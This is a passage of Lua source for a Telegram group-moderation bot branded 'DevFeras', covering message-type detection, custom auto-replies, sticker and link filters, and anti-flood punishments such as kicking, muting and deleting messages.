for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
Dev_Feras(msg.chat_id_,0, 1, "⌁︙عذرا عزيزي ↫ [@"..data.username_.."]\n⌁︙الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
else
Dev_Feras(msg.chat_id_,0, 1, "⌁︙عذرا عزيزي ↫ ["..data.first_name_.."](T.ME/DevFeras)\n⌁︙الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source DevFeras     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Added ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageVideo" then
print("This is [ Video ]")
msg_type = 'MSG:Video'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageAnimation" then
print("This is [ Gif ]")
msg_type = 'MSG:Gif'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageLocation" then
print("This is [ Location ]")
msg_type = 'MSG:Location'
end
--     Source DevFeras     --
if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
print("This is [ MarkDown ]")
msg_type = 'MSG:MarkDown'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageChatJoinByLink" then
print("This is [ Msg Join By Link ]")
msg_type = 'MSG:JoinByLink'
end
--     Source DevFeras     --
if msg.content_.ID == "MessageContact" then
print("This is [ Contact ]")
msg_type = 'MSG:Contact'
end
---
end
--     Source DevFeras     --
if ((not d) and chat) then
if msg.content_.ID == "MessageText" then
do_notify (chat.title_, msg.content_.text_)
else
do_notify (chat.title_, msg.content_.ID)
end
end
--     Source DevFeras     --
if msg.content_.text_ then
local content_text = DevFeras:get(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'del_repgp1' then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevFeras:del(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
DevFeras:srem(DevFeras..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
if msg.content_.text_ then
local content_text = DevFeras:get(DevFeras.."add:repallt"..msg.sender_user_id_)
if content_text == 'del_rep1' then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevFeras:del(DevFeras.."add:repallt"..msg.sender_user_id_)
DevFeras:del(DevFeras.."gif_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."voice_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."audio_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."photo_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."stecker_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."video_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."file_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."text_repall"..msg.content_.text_)
DevFeras:del(DevFeras.."rep_sudo",msg.content_.text_)
return false
end
end
--     Source DevFeras     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local content_text = DevFeras:get(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
if content_text == 'save_repgp' then 
if text == 'الغاء' then
local delrep_owner = DevFeras:get(DevFeras..'delrep_owner'..msg.chat_id_..'')
DevFeras:srem(DevFeras..'rep_owner'..msg.chat_id_..'',delrep_owner)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevFeras:del(DevFeras..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_)
DevFeras:del(DevFeras..'delrep_owner'..msg.chat_id_..'')
return false
end
DevFeras:del(DevFeras..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
local content_text = DevFeras:get(DevFeras..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
if msg.content_.video_ then DevFeras:set(DevFeras..'video_repgp'..content_text..''..msg.chat_id_..'', msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevFeras:set(DevFeras..'file_repgp'..content_text..''..msg.chat_id_..'', msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevFeras:set(DevFeras..'stecker_repgp'..content_text..''..msg.chat_id_..'', msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevFeras:set(DevFeras..'voice_repgp'..content_text..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevFeras:set(DevFeras..'audio_repgp'..content_text..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevFeras:set(DevFeras..'photo_repgp'..content_text..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then DevFeras:set(DevFeras..'gif_repgp'..content_text..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevFeras:set(DevFeras..'text_repgp'..content_text..''..msg.chat_id_..'', msg.content_.text_)
end 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevFeras:del(DevFeras..'addreplaygp:'..msg.sender_user_id_..''..msg.chat_id_..'')
DevFeras:del(DevFeras..'delrep_owner'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not DevFeras:get(DevFeras..'lock_reeeep'..msg.chat_id_) then 
if DevFeras:get(DevFeras..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras..'video_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevFeras:get(DevFeras..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras..'file_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevFeras:get(DevFeras..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras..'voice_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevFeras:get(DevFeras..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras..'audio_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevFeras:get(DevFeras..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras..'photo_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if DevFeras:get(DevFeras..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras..'gif_repgp'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if DevFeras:get(DevFeras..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras..'stecker_repgp'..msg.content_.text_..''..msg.chat_id_..''))
end
if DevFeras:get(DevFeras..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'') then
function Feras_dev(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevFeras:get(DevFeras..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevFeras:get(DevFeras..'text_repgp'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
Dev_Feras(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, Feras_dev)
end
end
--     Source DevFeras     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local content_text = DevFeras:get(DevFeras.."add:repallt"..msg.sender_user_id_)
if content_text == 'save_rep' then
if text == 'الغاء' then
local delrep_sudo = DevFeras:get(DevFeras..'delrep_sudo')
DevFeras:del(DevFeras.."rep_sudo",delrep_sudo)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ الرد', 1, 'md')
DevFeras:del(DevFeras.."addreply2:"..msg.sender_user_id_)
DevFeras:del(DevFeras.."add:repallt"..msg.sender_user_id_)
DevFeras:del(DevFeras.."delrep_sudo")
return false
end
DevFeras:del(DevFeras.."add:repallt"..msg.sender_user_id_)
local content_text = DevFeras:get(DevFeras.."addreply2:"..msg.sender_user_id_)
if msg.content_.video_ then
DevFeras:set(DevFeras.."video_repall"..content_text, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevFeras:set(DevFeras.."file_repall"..content_text, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevFeras:set(DevFeras.."stecker_repall"..content_text, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevFeras:set(DevFeras.."voice_repall"..content_text, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevFeras:set(DevFeras.."audio_repall"..content_text, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevFeras:set(DevFeras.."photo_repall"..content_text, photo_in_all_groups)
end
if msg.content_.animation_ then
DevFeras:set(DevFeras.."gif_repall"..content_text, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevFeras:set(DevFeras.."text_repall"..content_text, msg.content_.text_)
end 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرد الجديد', 1, 'md') 
DevFeras:del(DevFeras.."addreply2:"..msg.sender_user_id_)
DevFeras:del(DevFeras..'delrep_sudo')
return false end end
if msg.content_.text_ and not DevFeras:get(DevFeras..'lock_reeeep'..msg.chat_id_) then
if DevFeras:get(DevFeras.."video_repall"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras.."video_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."file_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras.."file_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."voice_repall"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras.."voice_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."audio_repall"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras.."audio_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."photo_repall"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras.."photo_repall"..msg.content_.text_))
end
if  DevFeras:get(DevFeras.."gif_repall"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevFeras:get(DevFeras.."gif_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."stecker_repall"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevFeras:get(DevFeras.."stecker_repall"..msg.content_.text_))
end
if DevFeras:get(DevFeras.."text_repall"..msg.content_.text_) then
function Feras_dev(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevFeras:get(DevFeras..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevFeras:get(DevFeras.."text_repall"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
Dev_Feras(msg.chat_id_, msg.id_, 1, Text ,  1, "md")
end
getUser(msg.sender_user_id_, Feras_dev)
end
end 
--     Source DevFeras     --
--      Spam Send       --
function NotSpam(msg,Type)
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n⌁︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n⌁︙قام بالتكرار تم حذف رسائله '
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if Type == "keed" then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
DevFeras:sadd(DevFeras..'abs:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n⌁︙قام بالتكرار المحدد تم تقييده '
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end  
if Type == "mute" then
DevFeras:sadd(DevFeras..'abs:Muted:'..msg.chat_id_,msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n⌁︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end  
--  end functions DevFeras --
--     Source DevFeras     --
--       Spam Check       --
if not VipMem(msg.sender_user_id_, msg.chat_id_) and msg.content_.ID ~= "MessageChatAddMembers" and DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= DevFeras then
floods = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevFeras:get(DevFeras.."abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevFeras:setex(DevFeras.."abs:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevFeras:hget(DevFeras.."abs:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source DevFeras     --
--      Process mod       --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local fname = dp.first_name_ or ""
local lname = dp.last_name_ or ""
local name = fname .. " " .. lname
local username = dp.username_
if username then
DevFeras:set(DevFeras..'user:Name'..msg.sender_user_id_,"@"..username)
else
DevFeras:set(DevFeras..'user:Name'..msg.sender_user_id_,name)
end;end,nil)   
--     Source DevFeras     --
----- START MSG CHECKS -----
if Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
return
end
if BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
return
end
if Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.ID == "MessagePinMessage" then
if MonshId(msg.sender_user_id_, msg.chat_id_) or tonumber(msg.sender_user_id_) == tonumber(DevFeras) then
DevFeras:set(DevFeras..'pinnedmsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevFeras:get(DevFeras..'pinnedmsg'..msg.chat_id_)
if pin_id and DevFeras:get(DevFeras..'bot:pin:mute'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevFeras:get(DevFeras..'bot:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevFeras:del(DevFeras..'bot:viewget'..msg.sender_user_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد مشاهدات المنشور هو ↫ ('..msg.views_..') \n ', 1, 'md')
DevFeras:del(DevFeras..'bot:viewget'..msg.sender_user_id_)
end
end
--     Source DevFeras     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if DevFeras:get(DevFeras..'bot:photo:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Photo]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     Source DevFeras     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if DevFeras:get(DevFeras..'markdown:lock'..msg.chat_id_) then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source DevFeras     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if msg.forward_info_ then
if DevFeras:get(DevFeras..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if DevFeras:get(DevFeras..'bot:document:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevFeras:get(DevFeras..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Document]")
end
end
if DevFeras:get(DevFeras..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if DevFeras:get(DevFeras..'bot:abstag:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [tag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevFeras:get(DevFeras..'bot:webpage:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevFeras:get(DevFeras..'bot:arabic:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevFeras:get(DevFeras..'bot:english:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     Source DevFeras     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if DevFeras:get(DevFeras..'bot:inline:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Inline]")
end
end
--     Source DevFeras     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not VipMem(msg.sender_user_id_, msg.chat_id_) then
if DevFeras:get(DevFeras..'bot:sticker:mute'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if DevFeras:get(DevFeras..'bot:tgservice:jk'..msg.chat_id_) then
